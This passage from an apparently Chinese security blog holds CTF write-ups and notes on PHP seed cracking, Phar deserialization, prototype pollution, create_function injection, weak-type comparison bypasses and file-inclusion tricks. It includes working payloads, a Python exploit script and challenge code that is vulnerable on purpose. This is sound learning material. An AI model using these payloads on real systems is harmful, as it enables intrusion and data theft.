    &lt;/FilesMatch&gt;

  -----------------------------334048973639751065563777068351
  Content-Disposition: form-data; name=&quot;submit&quot;

  ä¸éå»ä¸
  -----------------------------334048973639751065563777068351--</code></pre><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>扫出源码泄露：<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<pre><code class="php">&lt;?php 
header(&#39;Content-type:text/html; charset=utf-8&#39;);
error_reporting(0);
if(isset($_POST[&#39;login&#39;])){
    $username = $_POST[&#39;username&#39;];
    $password = $_POST[&#39;password&#39;];
    $Private_key = $_POST[&#39;Private_key&#39;];
    if (($username == &#39;&#39;) || ($password == &#39;&#39;) ||($Private_key == &#39;&#39;)) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header(&#39;refresh:2; url=login.html&#39;);
        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;
        exit;
}
    else if($Private_key != &#39;*************&#39; )
    {
        header(&#39;refresh:2; url=login.html&#39;);
        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;
        exit;
    }

    else{
        if($Private_key === &#39;************&#39;){
        $getuser = &quot;SELECT flag FROM user WHERE username= &#39;crispr&#39; AND password = &#39;$password&#39;&quot;.&#39;;&#39;; 
        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
        mysql_select_db(&quot;test&quot;,$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;
        }
    }
    }

} 
// genarate public_key 
function public_key($length = 16) {
    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $public_key = &#39;&#39;;
    for ( $i = 0; $i &lt; $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $private_key = &#39;&#39;;
    for ( $i = 0; $i &lt; $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code></pre>
<ul>
<li>通过公钥去还原随机数种子后，算出私钥</li>
</ul>
<pre><code class="php">  &lt;?php

   $pass_now = &quot;KVQP0LdJKRaV3n9D&quot;;
   $allowable_characters = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
   for($j = 0; $j &lt; strlen($pass_now); $j++)

   {

   for ($i = 0; $i &lt;= 61; $i++) {

   if($pass_now[$j] == $allowable_characters[$i])

   {

   echo &quot;$i $i 0 61 &quot;;

   break;

   }

   }

   }</code></pre>
<pre><code class="shell">  ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</code></pre>
<p>  <img src="http://goodcheerleung.gitee.io/mycute/20200401/15857273966848.png" alt="img">![im</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Phar反序列化拓展攻击学习笔记</title>
    <url>//articles/d3e1694f0d.html</url>
    <content><![CDATA[<h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h2><blockquote>
<p>Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。此外，PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行phar存档。 Phar有点像PHP应用程序的拇指驱动器。（译文）</p>
</blockquote>
<ul>
<li>简单理解就是他类似zip或者说类似jar，它将PHP文件打包成一个文件然后PHP可以在不解压的情况去访问这个包里面的php，并执行。<h3 id="Phar的结构"><a href="#Phar的结构" class="headerlink" title="Phar的结构"></a>Phar的结构</h3></li>
</ul>
<p><strong>1.</strong> <strong>phar文件标识</strong></p>
<pre><code class="php">&lt;?php
Phar::mapPhar();
include &#39;phar://phar.phar/index.php&#39;;
__HALT_COMPILER();
?&gt;</code></pre>
<p>​        格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<p><strong>2. a manifest describing the contents</strong><br>         phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<p><strong>3. the file contents</strong><br>         被压缩文件的内容。</p>
<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong><br>         签名，放在文件末尾，格式如下：    </p>
<h3 id="Phar的使用方法"><a href="#Phar的使用方法" class="headerlink" title="Phar的使用方法"></a>Phar的使用方法</h3><pre><code class="php">&lt;?php
    class User{
        var $name;
        function __destruct(){
            echo &quot;fangzhang&quot;;
        }
    }

    @unlink(&quot;test.phar&quot;);
    $phar = new Phar(&quot;test.phar&quot;);//后缀名必须为phar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub
    $o = new User();
    $o-&gt;name = &quot;test&quot;;
    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//添加要压缩的文件
    $phar-&gt;stopBuffering();
?&gt;</code></pre>
<p>得到的test.phar 内容如下：</p>
<pre><code>00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM
00000010: 5049 4c45 5228 293b 203f 3e0d 0a5b 0000  PILER(); ?&gt;..[..
00000020: 0001 0000 0011 0000 0001 0000 0000 0025  ...............%
00000030: 0000 004f 3a34 3a22 5573 6572 223a 313a  ...O:4:&quot;User&quot;:1:
00000040: 7b73 3a34 3a22 6e61 6d65 223b 733a 343a  {s:4:&quot;name&quot;;s:4:
00000050: 2274 6573 7422 3b7d 0800 0000 7465 7374  &quot;test&quot;;}....test
00000060: 2e74 7874 0400 0000 46fc 6e5d 0400 0000  .txt....F.n]....
00000070: 0c7e 7fd8 b601 0000 0000 0000 7465 7374  .~..........test
00000080: 9d18 4c48 ba24 6ed6 a810 3690 2aac 034e  ..LH.$n...6.*..N
00000090: 6aee e818 0200 0000 4742 4d42            j.......GBMB</code></pre><p>可以看到，有一部分是序列化之后的内容，就是我们在上一部分所说的<code>manifest</code>也就是<code>meta-data</code></p>
<h3 id="Phar反序列化原理"><a href="#Phar反序列化原理" class="headerlink" title="Phar反序列化原理"></a>Phar反序列化原理</h3><p>​        使用Phar://伪协议去读取Phar文件时候，文件会被当做phar对象，meta-data部分会被反序列化。</p>
<h4 id="测试Dome"><a href="#测试Dome" class="headerlink" title="测试Dome"></a>测试Dome</h4><pre><code class="php">&lt;?php
    class User{
        var $name;
        function __destruct(){
            echo &quot;test&quot;;
        }
    }

$file = &quot;phar://test.phar&quot;;
@file_get_contents($file);
?&gt;</code></pre>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="函数扩展"><a href="#函数扩展" class="headerlink" title="函数扩展"></a>函数扩展</h3><p>根据以上代码的测试可知，只要phar://协议解析文件的时候，就会造成序列化的问题，类似这样的函数不光有<code>file_get_contents</code>还有其他函数；</p>
<p>有大牛曾经总结过，所有文件操作的函数都可以触发这种序列化：</p>
<ul>
<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / `fopen``</li>
<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
<li><code>parse_ini_file</code></li>
<li><code>unlink</code></li>
<li><code>copy</code></li>
</ul>
<p>还有大牛深入的分析过这些函数的原理，并且加以扩展：</p>
<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom***</code></li>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
<p>几乎所有和IO有关的函数都涉及到了</p>
<h3 id="绕过图片头检查"><a href="#绕过图片头检查" class="headerlink" title="绕过图片头检查"></a>绕过图片头检查</h3><pre><code class="php">&lt;?php
class TestObject {}

$jpeg_header_size = 
&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;.
&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;.
&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;.
&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;.
&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;.
&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;.
&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;.
&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;.
&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;.
&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;;

$phar = new Phar(&quot;phar.phar&quot;);
$phar-&gt;startBuffering();
$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);
$phar-&gt;setStub($jpeg_header_size.&quot; __HALT_COMPILER(); ?&gt;&quot;);
$o = new TestObject();
$phar-&gt;setMetadata($o);
$phar-&gt;stopBuffering();</code></pre>
<h3 id="限制使用phar：-出现位置"><a href="#限制使用phar：-出现位置" class="headerlink" title="限制使用phar：//出现位置"></a>限制使用phar：//出现位置</h3><pre><code class="php">$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;</code></pre>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript原型链污染学习笔记</title>
    <url>//articles/d3e8844c56.html</url>
    <content><![CDATA[<h2 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h2><p>​        JavaScript常被称为基于原型的语言，也就是说js中没有类，在继承时候只有一种结构那就是对象（ <strong>object</strong> ）。每个对象都有一个私有属性那就是<code>__proto__</code>,而<code>__proto__</code>又会指向它的构造函数的原型对象（<strong>prototype</strong> ）一直到一个对象的原型对象为 <code>null</code>为止。</p>
<p>​        用一个不是很恰当的例子说明：</p>
<p>​        鸡生蛋，其中生蛋这个过程我们称之为<strong>构造函数</strong>，而鸡我们称为蛋的<strong>原型</strong>，而蛋孵出的小鸡又生小鸡，那么蛋又成为了小鸡的原型。</p>
<p>​        我们通过蛋的DNA又可以找到生他的母鸡，用母鸡的DNA又可找到<code>生母鸡的母鸡</code>，<code>母鸡的母鸡</code>的DNA又可以找到<code>生他母鸡的母鸡</code>这种类似家族的关系我们就称之为<strong>原型链</strong>。</p>
<p>​        原型链它又不是无限的，你在不断朔源他的家族最终会发现他的祖宗是宇宙大爆炸时候的奇点，而这个奇点不是鸡也不是蛋，也就是最终指向<code>null</code>.而鸡是乌鸡那他生的蛋孵出的小鸡也会是黑色的，这样的<code>遗传</code>关系我们称之为<strong>继承</strong>。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/1.png" alt="img"></p>
<h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>​        我们先来看一段代码,我们设置一个类parent内有a、b属性，我们给parent设置一个属性c赋值为‘3’。我们再设置一个类child内有a、b属性，并让child的原型为parent，我们实例化一个类child赋给s，输出对象s中的c属性发现其输出了3。这是为什么呢？</p>
<p><img src="http://goodcheerleung.gitee.io/blog/2.png" alt="img"></p>
<p>​        要理解这点有一个很重要的概念就是<strong>原型链变量搜索</strong>，我们要输出一个对象的某个属性如果在这个对象中不存在这个属性，就会在他的上层原型中搜索，遍历完这条原型链直到null为止。所以这条原型链其实是这样的：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/3.png" alt="img"></p>
<p>​        </p>
<p>​        下面我们以一个实际案例来讲解原型链污染,这是hackit 2018中的一道原型链污染的题目，以下是我摘要下来的代码（文末奉上链接），代码中<code>user.admintoken</code>是不存在的。那么我们要怎么让<code>md5(user.admintoken) === req.query.querytoken</code>条件成立呢？</p>
<pre><code class="javascript">var user=[];
app.get(&#39;/admin&#39;, (req, res) =&gt; { 
    /*this is under development I guess ??*/
    console.log(user.admintoken);
    if(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken){
        res.send(&#39;Hey admin your flag is &lt;b&gt;flag{prototype_pollution_is_very_dangerous}&lt;/b&gt;&#39;);
    } 
    else {
        res.status(403).send(&#39;Forbidden&#39;);
    }    
}
)
app.post(&#39;/api&#39;, (req, res) =&gt; {
    var client = req.body;
    var winner = null;
    matrix[client.row][client.col] = client.data;
    }</code></pre>
<p>​        我们发现<code>matrix[client.row][client.col] = client.data;</code>进行了一个赋值操作，client对象我们是可以控制的，上面我们说了每个对象都有一个私有属性<code>__proto__</code>,那么我们能不能控制<code>matrix</code>对象的原型从而控制<code>user.admintoken</code>呢？</p>
<p><img src="http://goodcheerleung.gitee.io/blog/4.png" alt="img"></p>
<p>​        从上我们在本地测试的结果来看是可以成功控制user的。这里我们也可以知道原型链污染的条件就是要能够控制键名。</p>
<p>而最终的exp是：</p>
<pre><code class="python">import requests
r = requests.post(&#39;http://target/api&#39;,json={&#39;row&#39;:&#39;__proto__&#39;,&#39;col&#39;:&#39;admintoken&#39;,&#39;data&#39;:&#39;qqq&#39;})
r = requests.get(&#39;http://target/admin?querytoken=&#39; + md5sumhex(&#39;qqq&#39;))
print r.text</code></pre>
<p>​        我们在来看大佬们一个简单的类，这也是大佬们经常举的例子：</p>
<pre><code class="javascript">function merge(target, source) {
for (let key in source) {
    if (key in source &amp;&amp; key in target) {
        merge(target[key], source[key])
    } else {
        target[key] = source[key]
        }
    }
}</code></pre>
<p>​        这是一个对对象进行合并的类我们在本地做个小实验看看能不能进行原型链污染，这里我们可以看到键名是可以被控制的。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/5.png" alt="img"></p>
<p>​        我们发现在s中没有b这个属性？，我们将test2的原型和s的原型分别输出来。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/6.png" alt="img"></p>
<p>​        我们可以发现s的原型直接是object所以在原型链搜索时候直接从object-&gt;null了。而test2上层原型却是一个对象，这个对象的再上层才是object。这是因为在创建字典时候<code>__proto__</code>不是当做键名处理而是作为<code>__proto__</code>给他的父类进行了赋值，所以<code>test2.__proto__</code>中存在b属性。那么要怎么样才能成功污染object呢？我们直接在前面加一个JSON.parse即可（把一个json字符串 转化为 javascript的object）。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/7.png" alt="img"></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>​        本人水平有限，难免出现纰漏和理解错误的地方。希望大佬们能够批评指出。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto</a>__</p>
<p><a href="https://www.anquanke.com/post/id/176884#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176884#h3-5</a></p>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><strong>Republic_of_Gayming</strong>：<a href="https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming" target="_blank" rel="noopener">https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming</a></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计-Create_function()函数</title>
    <url>//articles/d406ed92a6.html</url>
    <content><![CDATA[<h3 id="create-function-函数创建匿名函数的使用例子："><a href="#create-function-函数创建匿名函数的使用例子：" class="headerlink" title="create_function()函数创建匿名函数的使用例子："></a>create_function()函数创建匿名函数的使用例子：</h3><pre><code class="php">&lt;?php
$fun = create_function(&#39;$a,$b&#39;,&#39;return $a+$b;&#39;);
echo $fun(1,2);
?&gt;</code></pre>
<ul>
<li>预测结果就是答应一个3:</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191023/15718423282417.png" alt="img"></p>
<ul>
<li>还原一下它的执行过程</li>
</ul>
<pre><code class="php">eval(
&quot;
function fun($a,$b){
    return $a+$b;
}
&quot;
);</code></pre>
<ul>
<li>这个过程就很明显了，要想执行其他函数，先从function中逃逸出来，直接构造：<code>;}phpinfo();//</code>即可逃逸出来</li>
</ul>
<h3 id="其他构造匿名函数的方法"><a href="#其他构造匿名函数的方法" class="headerlink" title="其他构造匿名函数的方法"></a>其他构造匿名函数的方法</h3><pre><code class="php">&lt;?php
$calc =function() use ($a,$b){
    return $a+$b;
}
$calc(1,2);
?&gt;</code></pre>
<h3 id="典例："><a href="#典例：" class="headerlink" title="典例："></a>典例：</h3><pre><code class="php">&lt;?php
$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;
$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;

if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {
    show_source(__FILE__);
} else {
    $action(&#39;&#39;, $arg);
}</code></pre>
<p>有上面的知识铺垫，那么这里不难想出使用create_funtion,构造payload:<code>?action=\create_function&amp;arg=;}phpinfo();//</code>，<code>create_function</code>前面加上<code>\</code>可以直接绕过这个正则,因为这个正则是由字母或数字开始匹配其他内容，所以前面加上一个\可以直接绕过这个正则，但是只能用<code>\</code>其他的会无法找到该函数，具体原因如下。</p>
<p> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175719-cf670570-004f-1.png" alt="img"> </p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>回头看第一次打CTF的南宁杯-PHP弱类型比较</title>
    <url>//articles/d42556d8f5.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        南宁杯是我第一次打CTF比赛，当时PHP基础比较薄弱，回头看看几题。</p>
<pre><code class="php">&lt;?php
$white_list = range(0, 9);
require_once (&#39;flag.php&#39;);
if (isset($_REQUEST[&#39;no&#39;])) {
    $a = $_REQUEST[&#39;no&#39;];
    if (@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE) {
        echo &#39;no must be number&#39;;
    } else {
        if (in_array($a, $white_list)) {
            if (strlen($a) &gt; 1) {
                echo &#39;you are a great dark phper&lt;br&gt;&#39;;
                echo &quot;&lt;img src=&#39;dark.gif&#39;&gt;&lt;br&gt;&quot;;
                echo $flag;
            } else {
                echo &#39;you no dark&#39;;
            }
        } else {
            echo &#39;you are so dark&#39;;
        }
    }
}
else
    highlight_file(__FILE__);
?&gt;

</code></pre>
<ul>
<li><p>题目解析</p>
<p>当时是解出来这道题了，但是并没有懂得其中原理，我当时的payload是<code>?no=1%00--0,2,3,4,5,6,7,8,9</code>当时我以为是我传进来一个数组然后通过了 比较，但是其实并不是这样的，我传进去的仍然是一个字符串，但是为什么能够通过比较呢？这里in_array存在一个弱类型比较的问题，in_array存在三个参数:</p>
<pre><code>mixed:类型 支持做种复合类型,参数传入也是可以是int,str,float,array 

haystack:  源数组,查找的数组。

strict : 参数接受两个 true 和false 两个参数.该参数主要检查 $needle  和$haystack  中的value 的类型是否一致。</code></pre><p>​    如果第三个参数没使用true的话那么就会进行比较宽松的比较， 由于 PHP 是弱类型语言，在对两个不同类型的值进行操作（比较运算）时，会存在数据类型的 <strong>隐式转化</strong>。 那么我插入%00应该相当于1+空格，那么字符串长度就会大于1这样就会绕过大于一的限制，但是同时后面加入任何数都会转化为同类型进行比较，string类型全部转化为0那么也能够通过比较。这里相当于，<code>‘a&#39;==’0?==&gt;0==0</code>,但是为什么用%00这是因为ereg函数存在一个截断的漏洞。这样可以直接绕过这个函数的检测。当然另外一个payload也可以通过检测：<code>?no=01</code>原因相似</p>
<h1 id="延伸-PHP弱类型比较"><a href="#延伸-PHP弱类型比较" class="headerlink" title="延伸-PHP弱类型比较"></a>延伸-PHP弱类型比较</h1><h4 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp()函数"></a>strcmp()函数</h4><pre><code class="php">&lt;?php
    $password=&quot;XXXXXXX&quot;;
     if(isset($_POST[&#39;password&#39;])){
        if (strcmp($_POST[&#39;password&#39;], $password) == 0) {
            echo &quot;Right!!!login success&quot;;
            exit();
        } else {
            echo &quot;Wrong password..&quot;;
        }
    }
?&gt;
</code></pre>
<p>这里其实存在一个漏洞，<code>strcmp()</code>函数其实本质是将字符串转化为ASCII码再相减作，如果相减为0那么就是通过匹配，但是这里如果传入的的值并不是字符串类型同样会返回FLASE（0）进而通过比较，那么最后的payload<code>password[]=0</code>.</p>
<h4 id="switch-函数"><a href="#switch-函数" class="headerlink" title="switch()函数"></a>switch()函数</h4><pre><code class="php">&lt;?php
$i =&quot;3name&quot;;
switch ($i) {
case 0:
case 1:
case 2:
     echo &quot;this is two&quot;;
     break;
case 3:
     echo &quot;flag&quot;;
break;
}
?&gt;</code></pre>
<p>这里其实，<code>switch()</code>函数在进行case比较时候回将传入的字符串转化为整数型再进行比较。所以最终输出的是flag，这里和<code>intval()</code>一致。</p>
<h4 id="MD5-、sha1"><a href="#MD5-、sha1" class="headerlink" title="MD5() 、sha1()"></a>MD5() 、sha1()</h4><pre><code class="php">&lt;?php
if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) {
if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])
if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
die(&#39;Flag: &#39;.$flag);
else
print &#39;Wrong.&#39;;
}
?&gt;</code></pre>
<p>这两个函数在本次海啸杯也考察到了，不能处理数组，传入两个数组即可将其绕过。</p>
<h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><pre><code class="php">&lt;?php
if (isset($_POST[&#39;message&#39;])) {
    $message = json_decode($_POST[&#39;message&#39;]);
    $key =&quot;*********&quot;;
    if ($message-&gt;key == $key) {
        echo &quot;flag&quot;;
    }
    else {
        echo &quot;fail&quot;;
    }
}
else{
     echo &quot;~~~~&quot;;
}
?&gt;</code></pre>
<p>其实这个本质也是弱类型比较。只需构造<code>message={&#39;key&#39;:0}</code></p>
<h4 id="十六进制比较问题"><a href="#十六进制比较问题" class="headerlink" title="十六进制比较问题"></a>十六进制比较问题</h4><pre><code class="php">&lt;?php
function noother_says_correct($number)
{
       $one = ord(&#39;1&#39;);
       $nine = ord(&#39;9&#39;);
       for ($i = 0; $i &lt; strlen($number); $i++)
       {  
               $digit = ord($number{$i});
               if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
               {
                       return false;
               }
       }
          return $number == &#39;54975581388&#39;;
}
$flag=&#39;*******&#39;;
if(noother_says_correct($_GET[&#39;key&#39;]))
   echo $flag;
else
   echo &#39;access denied&#39;;
?&gt;</code></pre>
<p>这道题的意思就是要求输入一个key，然后这个key必须等于<code>54975581388</code>但是在自定义的函数里面又不允许出现数字，正好<code>54975581388=0xccccccccc</code>这样就绕过了检测。</p>
<h2 id="HASH比较操作符问题"><a href="#HASH比较操作符问题" class="headerlink" title="HASH比较操作符问题"></a>HASH比较操作符问题</h2><pre><code>&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true
&quot;0e1abc&quot;==&quot;0&quot;     //true4219903</code></pre><p>上面的比较确实会通过，那么为什么呢，在比较的时候，当出现xex模式，即匹配：<code>0e\d+</code>的 字符串将会当做科学计数法进行比较。</p>
<pre><code class="php">&lt;?php
     if (isset($_GET[&#39;Username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])) {
      $logined = true;
      $Username = $_GET[&#39;Username&#39;];
      $password = $_GET[&#39;password&#39;];
      if (!ctype_alpha($Username)) {$logined = false;}
      if (!is_numeric($password) ) {$logined = false;}
      if (md5($Username) != md5($password)) {$logined = false;}
    if ($logined){
    echo &quot;successful&quot;;
      }else{
            echo &quot;login failed!&quot;;
         }
     }
 ?&gt;</code></pre>
<p>payload:<code>md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;)</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>上传漏洞&amp;文件包含总结</title>
    <url>//articles/d42c963778.html</url>
    <content><![CDATA[<ul>
<li><strong>时间:2019年8月5日16:00:28</strong>        </li>
<li><strong>地点：福州大学</strong></li>
</ul>
<h2 id="文件包含漏洞利用技巧"><a href="#文件包含漏洞利用技巧" class="headerlink" title="文件包含漏洞利用技巧"></a>文件包含漏洞利用技巧</h2><h4 id="Apache日志文件包含"><a href="#Apache日志文件包含" class="headerlink" title="Apache日志文件包含"></a>Apache日志文件包含</h4><p>Apache会将所有请求写入日志文件中，所以如果在URl中写入一句话木马，再配合文件包含漏洞将可能直接getshell。</p>
<p>例如:提交一个get请求（使用burpsuite或者curl命令防止被url编码）</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649879122522.png" alt></p>
<h4 id="PHP-SESSION进度文件包含"><a href="#PHP-SESSION进度文件包含" class="headerlink" title="PHP_SESSION进度文件包含"></a>PHP_SESSION进度文件包含</h4><p>PHP5.4会将上传的进度和时间储存在SESSION中在上传结束之后会清空SESSION,如果存在文件包含的漏洞可以采取条件竞争的形式使得包含文件成功，执行任意代码。</p>
